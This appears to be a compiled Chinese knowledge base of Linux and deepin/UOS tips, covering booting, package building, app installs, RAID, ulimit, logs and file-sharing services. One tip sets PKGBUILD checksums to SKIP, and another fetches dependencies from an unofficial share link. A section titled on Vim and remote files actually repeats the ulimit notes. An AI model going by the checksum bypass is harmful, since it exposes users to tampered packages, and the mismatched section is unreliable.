
用diskpart将磁盘转为GPT：进入diskpart，list disk选磁盘，用convert gpt命令。

ESP分区格式为FAT，是存放引导文件的专门分区，让UEFI能找到引导程序。

bcdboot命令基本格式：bcdboot 系统 /l 语言 /s esp分区 /f UEFI 等，用于配置启动文件。

UEFI引导Linux需进入BIOS设为UEFI启动，关CSM和安全启动，磁盘为GPT格式，用新镜像安装。

UEFI shell的常用命令有ls、cp、rm、cd、help等，可执行文件管理等操作。

GRUB是开源引导管理器，支持多种系统和文件系统，主文件夹有/boot/grub/等。

grub-install命令用于安装GRUB，可指定目标设备、启动目录等参数。

grub-mkconfig -o /boot/grub/grub.cfg用于生成GRUB配置文件。

GRUB配置文件中的GRUB_TIMEOUT变量用于设置选择倒计时时间。

在GRUB命令行中，boot命令用于启动Linux系统映像。

UEFI做引导盘时，可直接操作U盘，或先做镜像再写入，需确保引导文件位置正确。

标题：V23下安装Linux版WPS、微信、搜狗输入法、Motrix的方法
在V23下安装WPS Linux版，终端输入ll-cli install cn.wps.wps-office。

安装搜狗拼音Linux版，需从搜狗拼音官网下载Linux-x86_64版本的deb包，双击运行deb包即可。

向日葵远程需从官网下载Linux-UOS版-amd64版的deb包，双击运行完成安装。安装后若在启动器和桌面看不到图标，需到/opt/apps/com.oray.sunlogin.client/entries/applications找到图标，复制到~/Desktop和/usr/share/applications。

安装微信Linux版，先下载星火商店里的Linux版微信的deb包，双击运行安装。安装后若启动器和桌面无图标，到/opt/apps/store.spark-app.wechat-linux-spark/entries/applications找到图标文件，复制到~/Desktop和/usr/share/applications。微信图标显示不正常，需将/opt/apps/store.spark-app.wechat-linux-spark/entries/icons/hicolor里相应尺寸的png文件复制到/persistent/linglong/entries/share/icons/hicolor对应尺寸的文件夹下的apps文件夹下，重启系统即可。

安装Motrix下载器，需在官网下载其deb包，双击安装时若提示缺依赖，需先安装缺失的依赖，最后安装Motrix的deb包。相关依赖包可通过链接https://cowtransfer.com/s/34dd3f4062804d或输入传输口令5g51sk获取。

大部分deb格式安装包在v23下安装不显示桌面和启动器图标的问题，可按找到图标复制到~/Desktop和/usr/share/applications的方法解决。

标题：vmkfstools命令
vmkfstools是虚拟磁盘工具，被比作虚拟磁盘中的瑞士军刀，可用于复制、转换、重命名、输入、输出和调整虚拟磁盘文件的大小。

vmkfstools的语法格式为：vmkfstools [参数]。

vmkfstools常用参数有：-i 原vmdk磁盘名，-d 目标磁盘的格式。

更改虚拟磁盘(vmdk)大小的命令为：vmkfstools -X 40g converter-one.vmdk。

精简置备转换至厚置备置零的命令：vmkfstools --inflatedisk /vmfs/volumes/DatastoreName/VMName/VMName.vmdk。

厚置备延迟置零转换至厚置备置零的命令：vmkfstools --eagerzero /vmfs/volumes/DatastoreName/VMName/VMName.vmdk。

登陆ESXI调整虚拟磁盘大小的命令：vmkfstools -X 40g converter-two.vmdk。

创建虚拟磁盘文件的命令：vmkfstools -C --createfs vmfs3。

标题：三模键盘的概念及如何选购三模键盘
三模键盘是指支持有线连接、蓝牙连接、2.4G无线连接三种连接模式的键盘。

单模键盘只支持一个连接模式，双模键盘支持两个连接模式，三模键盘支持三种连接模式。

三模键盘的有线连接方式直接，延迟低。

三模键盘的蓝牙连接适合外出办公携带，需设备支持蓝牙。

2.4G无线连接需在电脑插入接收器，打破设备限制，普通电脑都能使用。

选购三模机械键盘可根据功能分类，有台式键盘、笔记本电脑键盘等六类应用场景。

选购三模机械键盘要考虑工艺设计，包括外观、小键盘形状、刀工、平滑度等，影响使用寿命。

三模机械键盘按结构可分为全键盘、tenkeyless、60%键盘、日语、法语、游戏玩家系列。

选购三模机械键盘可根据触感，考虑压力克数（35g~60g不等）及压力曲线。

键盘键帽主要材料有ABS、POM和PBT，ABS最便宜但易发光，PBT昂贵，POM超耐磨。

选购三模机械键盘可根据个性设计，选择注重外观、风格和个性的键盘。

选购三模机械键盘可根据体积大小，小键盘适用于笔记本、pad等及手指较小的人。

标题：二进制文件封装成deb软件包
创建 Debian 软件包需安装 dpkg-dev 包，命令为 sudo apt-get update 和 sudo apt-get install dpkg-dev。

创建软件包需先建目录，命令为 mkdir mypackage 和 cd mypackage。

DEBIAN 子目录存放控制文件，control 文件含软件包元数据，如名称、版本等。

二进制文件通常放在 /usr/bin 或 /usr/local/bin 目录下，需在 control 文件指定架构。

安装或卸载时的特定操作可通过 DEBIAN 目录中的 postinst 和 postrm 脚本实现。

构建软件包的命令是在软件包目录上层执行 sudo dpkg-deb --build mypackage，会生成 .deb 文件。

安装软件包测试用 sudo dpkg -i mypackage.deb 命令，可运行二进制文件检查是否正常。

通过 apt install 安装需制作 APT 软件仓库，需设置仓库服务器和发布软件包。

编译 helloworld.c 为二进制文件用 gcc helloworld.c -o helloworld 命令。

二进制文件复制到 mypackage/usr/bin/ 目录，命令为 cp ./helloworld ./mypackage/usr/bin/mypackage。

安装 mypackage.deb 后，二进制文件会被复制到系统目录 /usr/bin/mypackage 中。

标题：从deepin迁移到其他Linux
UOS是Deepin的商业版本，更稳定，功能更多，有官方技术支持，付费激活（有免费活动），有30天试用期。

Manjaro Deepin是Manjaro Linux的社区版本，DDE更新较及时，2022-06时似乎无人维护。

ExTix Deepin基于deepin，有少量修改优化。

UbuntuDDE基于Ubuntu，有应用商店。

国内易上手的Linux发行版有Ubuntu Kylin，CutefishOS（社区版可用），JingOS（停更，适合触屏）等。

国际易上手的Linux发行版有Ubuntu及其风味版本，Linux Mint，Manjaro，openSUSE，Fedora，elementary OS，KDE Neon等。

安装Linux系统需下载iso镜像，用Ventoy制作启动盘，备份文件，建分区，从U盘启动按提示安装，挂载点设为/。

Linux安装后可能需安装驱动、换国内源、更新系统、调整设置、安装输入法及应用等。

Linux Mint安装deepin-wine需在/etc/apt/sources.list.d/建deepin.conf，添加源，在/etc/apt/preferences.d/建deepin文件，设优先级，更新源后安装。

Manjaro用yay安装deepin-wine应用，微信包名有deepin-wine-wechat、com.qq.weixin.spark，QQ有com.qq.im.deepin (TIM)、com.qq.tim.spark。

星火商店支持多数Debian系发行版，在非deepin/UOS的Debian系上需先装依赖，再装商店客户端。

Vek可安装配置Wine/deepin-wine，管理Windows应用，在Linux Mint上因缺libicui18n.so.63报错，安装特定deb包可解决。

Manjaro装软件时报有效性检查错误，可下载deb包，修改/home/用户名/.cache/yay/软件包名/下PKGBUILD文件，将校验项改为SKIP，再执行makepkg -i。

标题：使用sudo命令响应慢
终端使用sudo命令时，输入密码的提示出现速度变慢。

解决sudo命令响应慢的办法：修改/etc/hosts文件，添加127.0.1.1 host_name（host_name为用户名）。

修改/etc/hosts文件可使用命令sudo vi /etc/hosts。

标题：使用v23系统时需要手动更新玲珑应用
v23系统更新时不会更新玲珑应用，可能导致应用无法使用或启动，需手动更新。

在终端中输入ll-cli list可查看玲珑应用。

在终端中输入ll-cli update可根据包名更新玲珑应用。

标题：使用工具调节系统缩放率
在系统设定之外可通过软件调节缩放率，介绍简单方法。

v20下在终端执行命令安装：sudo apt install dconf-editor

v23在终端下执行命令安装：sudo apt install org.gnome.wiki.projects.dconf

通过软件调节系统缩放率的方法简单高效。

标题：关于linux下时区设置问题
中国标准时间（北京时间）由中国官方确定，互联网上时区由IANA管理，IANA曾属美国政府，后让渡给ICANN。

IANA创建的时区规范是tz database（tzdata），在GNU/Linux系统中存于/usr/share/zoneinfo/目录，含二进制时区文件及辅助文本文件。

/usr/share/zoneinfo/zone.tab文件存放时区的国家或地区代码、坐标、时区名称和注释，其中定义的是主要（Canonical）时区，未定义但有文件的是链接（Link）时区，用于向后兼容。

tzdata的时区名称常用城市命名，/usr/share/zoneinfo/Asia/目录下有5个中国大陆城市对应民国时代五个时区：昆仑时区（Asia/Kashgar喀什）、新藏时区（Asia/Urumqi乌鲁木齐）、陇蜀时区（Asia/Chongqing、Asia/Chungking重庆）、中原标准时区（Asia/Shanghai上海）、长白时区（Asia/Harbin哈尔滨）。

Asia/Kashgar、Asia/Chongqing、Asia/Chungking、Asia/Harbin已被弃用，Asia/Kashgar被Asia/Urumqi替换，其他替换为Asia/Shanghai。zone.tab中Asia/Shanghai注释为Beijing Time（北京时间），Asia/Urumqi注释为Xinjiang Time（新疆时间）。

BSD系列和GNU系列系统内置时区标准为tzdata，Windows系统时间不采用tzdata，但互联网应用程序需使用。浏览器控制台可执行Intl.DateTimeFormat().resolvedOptions().timeZone查看本机时区。

标题：创建RAID磁盘阵列
使用mdadm命令来创建RAID磁盘阵列，详细用法参考[man mdadm](https://linux.die.net/man/8/mdadm)。

创建RAID前，需使用fdisk对需要的磁盘进行格式化。

创建raid6的命令：mdadm -C -v /dev/md6 -a yes -l 6 -n 7 /dev/sd[b-h]1。-C为创建选项，-v显示详细过程，/dev/md6是raid卷路径，-l 6指定级别，-n 7是磁盘数，/dev/sd[b-h]1是具体磁盘。

验证raid6创建结果用命令：mdadm -D /dev/md6。

格式化raid6的命令：mkfs.ext4 /dev/md6。

配置开机自动挂载，先确定挂载目录，没有则用mkdir -p /media/md6创建。

获取挂载磁盘UUID用blkid命令，/dev/md6的UUID为f2ee12a8-2c96-48d5-af11-f555d2eef1f5。

fstab条目格式：<fs spec> <fs file> <fs vfstype> <fs mntops> <fs freq> <fs passno>。/dev/md6的条目为UUID=f2ee12a8-2c96-48d5-af11-f555d2eef1f5 /media/md6 ext4 defaults 0 0。

配置fstab后，用mount -a验证是否有错误。

保存raid6配置用命令：mdadm --detail --scan --verbose >> /etc/mdadm/mdadm.conf。

保存配置后，执行update-initramfs -u更新引导文件，确保重启后RAID名称不变。

标题：剪切板常见问题
剪切板出现重复图片，很大几率是后端处理导致系统剪切板所有权转变，收到多次数据改变信号，相同数据显示多次。

分析剪切板重复图片问题，可进入/home/tmr/.cache/deepin/dde-clipboardloader目录，记当前日志位置，触发截图，查看FROM_DEEPIN_CLIPBOARD_MANAGER字符串打印次数，正常应打印两次，一次截图只打印一次则是后端问题，该字段用于前端过滤重复数据。

剪切板各类数据异常问题包括图片异常、图标异常、文本丢失、文件缺失。

分析剪切板数据异常问题，可在ClipboardLoader::doWork()函数中打印所有收到的系统剪切板数据，查看各字段是否异常，是否为空、是否缺失，不同数据类型有不同字段。

剪切板数据类型不同，包含字段不同，文本、文件、图片等有img、text、timestamp、html等字段。

打印系统剪切板数据的代码为：const QMimeData *mimeData = m_board->mimeData();for (int i = 0; i < mimeData->formats().size(); ++i) {qDebug()<<"format:"<<mimeData->formats()[i]<<", data:" <<mimeData->data(mimeData->formats()[i]);}

标题：双系统安装时为什么要先安装windows再安装linux
个人计算机架设的Linux主机开机过程：1. 加载BIOS硬件信息，进行硬件系统的自我测试，取得第一个可开机的装置（BIOS决定）；2. 读取并执行MBR的开机管理程序（Boot loader）；3. 开机管理程序指定使用哪个核心来开机，kernel开始侦测硬件与加载驱动程序；4. kernel呼叫systemd程序，开机。

Boot loader的功能：提供选单，用户可选择不同开机项目；载入核心文件，识别操作系统文件格式以加载核心到主存储器执行；转交其他loader，将开机管理功能转交给其他loader。

主机安装不同操作系统：必须使用自己的loader加载自身操作系统核心；系统的MBR只有一个，需合理安排windows与Linux的安装。每个文件系统会保留启动扇区提供操作系统安装boot loader。

双系统安装顺序原因：Windows的loader不具有控制权转交功能，不能加载Linux的loader。先装windows再装linux，MBR中windows的loader会被Linux的loader覆盖，Linux的loader选单功能可启动双系统。

标题：在Deepin自带的安卓模拟器uengine中安装apk的方法
在Deepin的uengine中安装apk使用命令：uengine install --apk=绝对路径，$PWD表示当前路径。

若uengine命令不存在或安卓环境未启动，需先在系统应用商店安装安卓应用，无“手机应用”分类则检查更新并重启。

启动装好的apk使用命令：uengine launch --package=org.anbox.appmgr --component=org.anbox.appmgr.AppViewActivity。

运行安卓应用需deepin/UOS官方源里的5.10内核，其他内核可能导致安卓容器无法启动。

deepin/UOS的uengine是开源安卓应用容器anbox的修改版，anbox使用GPL-3许可。

可用该方法安装微信32位版apk，能运行在平板模式，实现手机电脑同时登陆。

标题：Linux系统资源限制相关知识
ulimit命令可查看用户层面的系统资源限制，其配置基于/etc/security/limits.conf，且/etc/security/limits.d目录中的配置文件会按字母顺序覆盖相同或更具体的设置。

ulimit -a 可查看所有资源上限，其中关注的有：-s栈大小8MB，-u进程上限30000多，-n文件描述符上限1024。ulimit -Ha和ulimit -Sa可查看硬限制和软限制，硬限制由root设置，非root可降低硬限制，只有root能增加；非root不能超过软限制，但可将软限制增加到硬限制。

ulimit -n 1024 可临时修改当前shell的文件描述符限制，修改/etc/security/limits.conf可使修改永久生效，需重启。

实验1中，修改/etc/security/limits.conf后，文件描述符上限从1024改为10240，测试能打开10217个临时文件，因程序自身打开一些文件等，总数非10240。

实验2中，在/etc/security/limits.conf添加配置修改栈空间上限，C程序测试显示调整后进程栈空间约8192000B，调到临界值程序发生段错误。

系统层面，单个进程打开文件句柄数上限10亿，系统分配的pid上限400多万，file-max（内核级别最大文件描述符）上限600万，系统全局总线程数限制6万，单个程序内存映射空间数量6万。

redis打开时会将文件描述符上限从1024调整到10032以适应更多网络连接，源码中通过调用setrlimit(RLIMIT_NOFILE,&limit)进行临时调整。

prlimit是另一个类似ulimit的命令。

标题：在Linux中使用flatpak
Flatpak是一种构建、发布、安装和运行应用程序的工具。

Flatpak的设计目标包括使应用程序可安装在任何发行版上。

Flatpak能为应用程序提供固定环境，实施测试和减少缺陷。

Flatpak可实现应用程序和操作系统的解耦，不依赖特定发行版本。

Flatpak让应用程序可自带依赖，避免对特定发行版或库的依赖。

Flatpak使应用程序在沙箱中独立运行，提升安全性。

安装Flatpak的命令是sudo apt install flatpak。

添加Flathub仓库的命令是flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo。

移除Flathub仓库使用flatpak remote-delete flathub命令。

镜像Flathub仓库的命令是sudo flatpak remote-modify flathub --url=https://mirror.sjtu.edu.cn/flathub。

查找应用使用flatpak search xxx命令。

安装应用的Flatpak命令是flatpak install xxx。

删除应用使用flatpak uninstall xxx命令。

更新应用的Flatpak命令是flatpak update xxx。

运行应用使用flatpak run xxx命令。

Flatpak安装包可从https://flatpak.org/setup/下载。

Flathub仓库的网址是https://www.flathub.org/apps。

上海交大镜像的地址是https://mirrors.sjtug.sjtu.edu.cn/docs/flathub。

Flatpak文档的网址是https://docs.flatpak.org/zh_CN/latest/。

标题：在Linux系统中使用Vim读写远程文件的命令详解
ulimit命令可查看用户层面的系统资源限制，其配置与/etc/security/limits.conf及/etc/security/limits.d目录文件相关，后者按字母顺序读取可覆盖前者相同或更具体设置。

ulimit -a可查看所有资源上限，关注的有：-s栈大小8MB，-u进程上限3万多，-n文件描述符上限1024。ulimit -Ha和ulimit -Sa分别查看硬限制和软限制，硬限制由root设置，非root可降低但不能增加，软限制非root可增到硬限制。

ulimit -n 1024可临时修改文件描述符限制，仅当前shell生效。修改/etc/security/limits.conf可永久生效，需重启。

修改文件描述符上限实验：在/etc/security/limits.conf添加配置，重启后生效。测试打开10240个临时文件，修改前默认1024时最多打开1001个，修改后可打开10217个，因程序自身打开一些文件等。

修改栈空间上限实验：在/etc/security/limits.conf添加配置，C程序测试栈帧，调至临界值程序发生段错误，调整后进程栈空间约8192000B附近。

系统层面资源限制：单个进程打开文件句柄数上限10亿，pid上限400多万，file-max（内核级最大FD）600万，系统全局总线程数限制6万，单个程序内存映射空间数量6万。

redis打开时会将文件描述符上限从1024调整到10032以适应更多网络连接，源码中通过setrlimit(RLIMIT_NOFILE,&limit)临时调整。

prlimit是与ulimit类似的命令。

Linux限制资源上限是为了充分利用机器，发挥性能，避免资源闲置浪费。

标题：多系统环境下，deepin中无法访问windows分区
多系统环境下，deepin系统中可能无法访问windows系统文件，无权限创建文件和文件夹。

deepin下访问Windows系统盘时文件上锁，无法创建文件或文件夹的问题，有用户在论坛反馈。

快速启动模式下，关机时windows会将硬盘分区写保护，导致linux无法向这些分区写入数据。

解决deepin无法访问windows分区的方法之一是在windows系统中关闭“快速启动”。

windows系统中关闭快速启动，可先按win+x，弹出常用菜单，选择“电源选项”。

在设置-电源和睡眠界面，需选择“其它电源设置”项以继续关闭快速启动。

通过“电源按钮的功能”项可进入系统设置界面，以便关闭快速启动。

需通过“更改当前不可用的设置”项，取消“快速启动”设置，然后保存修改。

保存修改后关机，开机进入deepin系统，即可向windows系统分区写入数据。

标题：如何关闭三模键盘默认功能键
三模键盘默认有功能键，可通过特定命令关闭。

关闭三模键盘默认功能键的第一个命令是echo options hid_apple fnmode=2 | sudo tee -a /etc/modprobe.d/hid_apple.conf。

关闭三模键盘默认功能键的第二个命令是sudo update-initramfs -u -k all。

关闭三模键盘默认功能键需执行两个命令，分别是echo options hid_apple fnmode=2 | sudo tee -a /etc/modprobe.d/hid_apple.conf和sudo update-initramfs -u -k all。

标题：如何删除文件管理器搜索记录
deepin系统下，文件管理器关闭后，搜索历史保存在~/.config/deepin/dde-file-manager/dde-file-manager.obtusely.json中。

清除deepin系统文件管理器搜索历史，需先关闭文件管理器，再删除相关文件中的文本。

标题：如何在Linux中安装MicrosoftEdge浏览器
Edge浏览器最初发布于Windows 10，后支持Mac OS、X Box和Android，Linux开发版供开发者测试使用。

目前Linux版Edge仅支持本地账户，无法使用Microsoft等网络账户登录。

在Linux上安装Microsoft Edge有两种方法：从官网下载安装包、使用包管理器安装。

Ubuntu/Deepin系统用.deb文件安装Edge：wget下载deb包，再sudo dpkg -i安装。

Fedora/OpenSUSE系统用.rpm文件安装Edge：wget下载rpm包，再rpm -ivh安装。

Ubuntu/Deepin用包管理器安装Edge：导入密钥，添加源，更新，安装microsoft-edge-dev。

Fedora用包管理器安装Edge：导入密钥，添加源，重命名repo文件，dnf安装。

OpenSUSE用包管理器安装Edge：导入密钥，添加源，刷新，zypper安装。

标题：Deepin软件包转通用deb软件包脚本
该脚本可将deepin deb包重打包为debian deb包，解决在debian/ubuntu等非deepin/uos发行版中安装后无图标的问题，并去除对deepin-elf-verify软件包的依赖。

使用脚本前需执行sudo chmod +x /usr/local/bin/deepin-packge-to-debian-package.sh，再创建new-deb目录，最后运行sudo deepin-packge-to-debian-package.sh xxx.deb new-deb。

脚本文件名为/usr/local/bin/deepin-packge-to-debian-package.sh。

脚本会先检查输入的deb包路径和保存目录是否为空，以及是否以root权限运行，若不满足则提示用法并退出。

脚本会将deb包提取到/tmp/deepin-packge-to-debian-package/extract/目录，包括使用dpkg -X提取内容和dpkg -e提取DEBIAN信息。

若存在/opt/apps/目录，脚本会获取包名，并通过linkDir函数将entries下的目录链接到/usr/share/对应目录。

脚本会清理依赖，通过sed命令移除对deepin-elf-verify的依赖信息。

脚本使用dpkg-deb -b命令将处理后的内容重新打包，并保存到指定目录，最后清理临时文件。

标题：如何注册Gmail邮箱
使用网易邮箱大师注册Gmail邮箱账号：1. 在手机应用商店内，搜索并安装网易邮箱大师手机客户端APP，启动后，如果有大师帐号，就“登录大师帐号”，如果没有大师帐号，直接在“添加邮箱”页面输入要注册的新Gmail帐号，填写后，点击下一步。2. 注意，上一步操作的目的，是调出“使用Google帐号登录”的页面，然后再点击“创建帐号”。3. 在创建您的Google帐号页面，填写姓名、邮箱地址、密码，然后“下一步”。4. 然后，验证手机号码的环节,填写中国国内使用的手机号就可以，点击“下一步”。几秒之内，就成功收到6位数字的短信验证码，输入，再点击“验证”。5. 如果没收到短信，检查一下是否被手机拦截，也可以点击“拨打语音电话”，根据语音提示的数字填写。填写安全手机号（默认填写刚才验证的）、辅助邮箱地址（将来更改设置时接收安全验证码使用）和生日、性别等，下一步。然后提示“充分利用您的电话号码”，点击“立即启用”，如果不理解什么意思，可以点击“跳过”这一步。接下来是“隐私权及条款”，可以直接点击“我同意”，也可以点击“更多选项”，自己选择是否保存网络与应用活动到Google帐号、是否展示个性化广告、是否将YouTube历史记录保存到Google帐号，最后再点击“我同意”。这些设置以后都可以更改。到此，已经成功注册了新Gmail邮箱帐号了

标题：如何清理文件管理器的搜索历史记录
文件管理器的搜索历史在关闭文件管理器之后保存在了文件，地址是~/.config/deepin/dde-file-manager/dde-file-manager.obtusely.json当中。那么要清除文件管理器的搜索历史也就是把dde-file-manager.obtusely.json这个文件中的相关文本删除，只不过有个前提是在打开这个文件之前先得把文件管理器关闭。

先说下我的系统和软件版本：1. OS：Deepin 20.6版本 2. 文件管理器，命令行中dde-file-manager -v显示版本为 5.6.4

打开dde-file-manager.obtusely.json文件后，如有有搜索历史记录的话，是出现在如下图所示的位置的，图片显示的是有2条记录：把图片中红色箭头指向的两行删除，再保存文件就可以了，重新打开文件管理器，就没有搜索历史记录了。

另外，写了一个sh脚本文件，可放在任意目录下面，然后在该目录下打开终端，在终端中执行此脚本就可以清除上述搜索历史记录，更省事一点，例如：sh脚本文件名称：del_file_search_cache_simple.sh

直接资源管理器搜索dde-file-manager.obtusely.json这个文件，然后用自带的编辑器打开，手动删除里面不想保留的记录，然后Ctrl+s退出即可。

echo "检查、删除文件管理器的搜索栏的搜索历史缓存：" startline=0 del_st=0 endline=0 del_end=0 linecount=0 restart=0 filepath=~/.config/deepin/dde-file-manager/dde-file-manager.obtusely.json if [ ! -f  "${filepath}" ];then echo "" echo "文件${filepath}不存在。" echo "已退出检查。" else while read line do linecount=$(expr ${linecount} + 1) if [ "${line}" == "\"SearchHistroy\": [" ]; then startline=${linecount} del_st=$(expr ${linecount} + 1) fi if [ "${line}" == "]" ]; then endline=${linecount} del_end=$(expr ${linecount} - 1) fi done < ${filepath} del_is=0 del_is=$(expr ${endline} - ${startline} - 1) if [ ${del_is} -gt 0 ]; then sed -i ${del_st},${del_end}d ${filepath} echo "已删除 ${del_is} 条搜索记录缓存！" restart=1 else echo "没有检查到搜索记录缓存。" echo "小提醒：执行本脚本前，请关闭文件管理器。" fi echo "检查完成！" if [ ${restart} -eq 1 ];then echo "现在可以重新打开文件管理器使用了。" echo "" fi fi

标题：如何自定义禁用鼠标中键
鼠标中键有粘贴功能，用户常误触导致粘贴，需禁用。

禁用中键粘贴且开启侧键复制粘贴：xmodmap -e "pointer = 1 25 3 4 5 6 7 2"。

仅禁用中键粘贴命令：xmodmap -e "pointer = 1 25 3 4 5 6 7 8"。

恢复中键功能命令：xmodmap -e "pointer = 1 2 3 4 5 6 7 8"。

xmodmap修改按键映射，pointer表鼠标，前三个参数对应鼠标左、中、右按键。

左手操作鼠标可交换左右键：xmodmap -e "pointer = 3 2 1 4 5 6 7 8"。

标题：如何解决软件卸载不干净的问题
解决软件卸载不干净可尝试命令：dpkg -l | grep "^rc" | awk '{print $2}' | xargs sudo apt -y purge

dpkg -l 列出系统中安装的所有包的状态，'ii'开头的是正常安装的包，'rc'开头的则是删除但仍留下配置文件的包。

grep "^rc" 用于提取以 rc 开头的包，也就是被删除但仍残留配置文件的包的信息的行。

awk '{print $2}' 打印这些包的名字，他们位于 dpkg -l 输出结果的第二个字段。

xargs sudo aptitude -y purge 把上述输出的包名放在命令后，purge命令会清除配置文件，-y参数自动对提示回答是。

标题：如何通过本地环境进行deb包的构建
deb包类似于windows平台下的install安装文件，是debain系统下用来安装程序的一个文件

环境下载：1.首先配置下 apt源(新人文档3.1) 2.执行 sudo apt update 更新一下列表 3.执行 sudo apt install dh-make

生成debian目录：在要打包的目录下输入命令：dh_make -c gpl --native --single --packagename test_1.0.0 --email minkush@example.com，可创建debian文件夹

dh_make参数：-c 设置LINCENSE类型；--native 本地构建，不生成.orig归档文件；--single 设置包为二进制类型；--packagename 设置包名称；--email 填写构建者邮箱

changelog文件格式：包名 (版本号) 分配; 紧急程度=低；日志部分前面有2个空格+*+空格；尾部为 空格 -- 维护者姓名 <邮箱> 时间

compat文件：定义debhelper的兼容级别，兼容旧版本可echo 9 > compat，不推荐低于9

control文件：第1–7行是源代码包控制信息，第9–13行是二进制包控制信息，包含名称、分类、优先级等

control文件的Section分类包含main (自由软件)、non-free (非自由软件)、contrib (依赖于非自由软件的自由软件)

control文件的Priority中optional适用于与优先级为required、important或standard的软件包不冲突的新软件包

control文件的Build-Depends：使用dh命令打包的软件包必须包含debhelper (>=9)，其他依赖用,隔开

control文件的Architecture：any适用于编译型语言程序，依赖具体体系结构；all适用于文本等，独立于体系结构

copyright文件：存放LICENSE文件，使用-c gpl命令会自动生成

manpage文件：是man命令调用的帮助手册，最终文件名应为程序名，以.1为第一个后缀

{pre,post}{inst,rm}是shell脚本，preinst是安装前执行，prerm是删除前执行，postinst是安装后执行，postrm是删除后执行

source/format文件选项：3.0 (native)用于Debian本土软件；3.0 (quilt)用于其他所有软件

patches/*目录含*.patch和series文件，*.patch是git生成的补丁包，series文件记录所有*.patch文件

*.install文件：类似cmake的install函数，将文件拷贝到指定目录，源文件地址是debian文件夹同级目录

构建deb包：执行sudo apt install devscripts，在项目目录下执行debuild --no-lintian -b -us -uc -nc -j4

标题：屏保
屏幕保护是为了保护显示器而设计的一种专门的程序。

查询当前屏保可执行命令：qdbus com.deepin.ScreenSaver /com/deepin/ScreenSaver com.deepin.ScreenSaver.currentScreenSaver。

通过Dbus com.deepin.ScreenSaver服务的allScreenSaver属性链表获取屏保名，使用GetScreenSaverCover(String name)方法传入屏保名获取屏保路径。

屏保相关Dbus服务名：com.deepin.ScreenSaver，地址：/com/deepin/ScreenSaver，接口：com.deepin.ScreenSaver。

Dbus方法GetScreenSaverCover(String name)的参数name为屏保名字，如“flurry”，返回值为imagePath。

Qt代码中屏保服务相关设置：服务service为"com.deepin.ScreenSaver"，路径path为"/com/deepin/ScreenSaver"，接口interfaceName为"com.deepin.ScreenSaver"。

当前屏保的名字保存在Dbus com.deepin.ScreenSaver服务的currentScreenSaver属性中。

通过Dbus org.freedesktop.DBus服务的ListActivatableNames方法获取可用服务列表，若不含com.deepin.ScreenSaver则需屏蔽屏保功能显示。

检测屏保服务相关Dbus服务名：org.freedesktop.DBus，地址：/org/freedesktop/DBus，接口：org.freedesktop.DBus。

Dbus方法ListActivatableNames的返回值为Array of [String] arg_0。

桌面禁用屏保的三种方式：环境变量、卸载屏保、gsetting配置，任意一种设置为禁用即生效。

环境变量配置禁用屏保：在系统环境变量中添加DESKTOP_CAN_SCREENSAVER=N。

卸载屏保的命令：sudo apt remove deepin-screensaver。

通过gsetting配置禁用屏保：使用gsettings设置show-screen-saver的值为false，设置为true则不禁用。

标题：常用日志采集方法
系统崩溃、卡死、死机时，可尝试切换TTY（Ctrl+Alt+F2），查看键盘大小写灯，无反应则强制重启并提取内核日志：cat ~/kern.log | grep -i "Call Trace"，还需采集~/.kwin.log、/var/log/及可能的coredump日志。

标题：无法进入系统
无法进入系统（如开机、锁屏后、升级或重启后）需采集~/.cache/deepin/、~/.xsession-errors、~/.xsession-errors.old、/var/log/。

标题：桌面显示异常
桌面显示异常（蓝屏、白屏等）需采集~/.kwin.log、/var/log/及可能的coredump日志。

标题：DDE模块日志
dde-无法显示登陆界面（Lightdm）日志路径：/var/log/lightdm/lightdm.log。

dde-登陆界面（lightdm-deepin-greeter）日志路径：/var/log/lightdm/seat0-greeter.log。

dde-后端startdde日志生成：sudo journalctl -b /usr/bin/startdde >~/Desktop/startdde.log。

标题：系统内核日志
系统/内核的整体系统信息日志路径：/var/log/messages，包含系统启动期间日志。

系统授权信息（用户登录等）日志路径：/var/log/auth.log。

系统无法启动时查看内核日志路径：/var/log/kern.log。

标题：系统组件&应用日志
应用商店日志路径：~/.cache/deepin/deepin-app-store/deepin-app-store.log。

终端日志路径：~/.cache/deepin/deepin-terminal/deepin-terminal.log，需提供版本及可能的coredump。

浏览器日志路径：~/.cache/deepin/org.deepin.browser/。

文件管理器日志路径：~/.cache/deepin/dde-desktop/dde-desktop.log、~/.cache/deepin/dde-file-manager/dde-file-manager.log等。

标题：常见日志获取方式
启动器日志路径：~/.cache/deepin/dde-launcher/dde-launcher.log，应用版本信息获取命令：dpkg -l > Desktop/version

系统普通日志可通过sudo less /var/log/messages查看最后10行

系统启动日志（包括启动引导时）可通过sudo dmesg | less查看

标题：常见网络存储服务搭建方法
Samba是在Linux系统上实现SMB协议的免费软件，由服务器及客户端程序构成，为局域网内不同计算机提供文件及打印机等资源共享服务。

安装Samba服务的命令为sudo apt-get install samba-common samba。

创建Samba共享文件夹可使用sudo mkdir /opt/share命令。

Samba配置文件smb.conf分为全局设置和共享定义两部分，绝对路径在/etc/samba/smb.conf。

Samba全局设置中，workgroup用于设置Windows中显示的工作组，server string是服务器说明，建议将编码设为UTF-8，即unix charset = UTF-8，对不认识Unicode的Windows系统用dos charset = cp936，security字段常用share和user验证方式，user方式需设置security = user。

Samba共享设置可在smb.conf末尾添加[share]等配置，其中comment是描述，path指定路径，public、writeable、browseable、guest ok分别控制可见性、可写性和匿名访问。

添加Samba用户可先用sudo useradd smbuser新增用户，再用sudo smbpasswd -a smbuser创建共享密码，修改用户口令用带-U参数的smbpasswd命令，用户可通过-r参数在本地修改服务器上自己的口令。

赋予smbuser对Samba共享目录写权限，需将writeable设为yes，若目录本身不可写，还需执行sudo chown smbuser:smbuser /opt/share。

Samba服务启动用service smbd start，停止用service smbd stop，重启用service smbd restart，查看状态用service smbd status。

Samba常见问题：修改配置文件后服务无法启动可能是参数后有特殊字符；多重连接报错可先断开连接再登录；防火墙问题可修改limits.conf后重启；无法写入可能需调整权限。

vsftpd是Linux上安全好用的ftp服务，配置文件为vsftpd.conf，路径在/etc/vsftpd.conf。

安装vsftpd用sudo apt install vsftpd，若找不到安装包可先执行sudo apt update。

vsftpd服务启动用service vsftpd start，停止用service vsftpd stop，重启用service vsftpd restart，查看状态用service vsftpd status。

vsftpd建议关闭匿名登录，使用本地用户登录，实际可用配置项包括listen=YES、anonymous_enable=NO、local_enable=YES等。

SFTP服务端群组配置：sudo groupadd sftp创建群组，sudo useradd -g sftp -s /bin/false mysftp新增用户，sudo passwd mysftp设置密码。

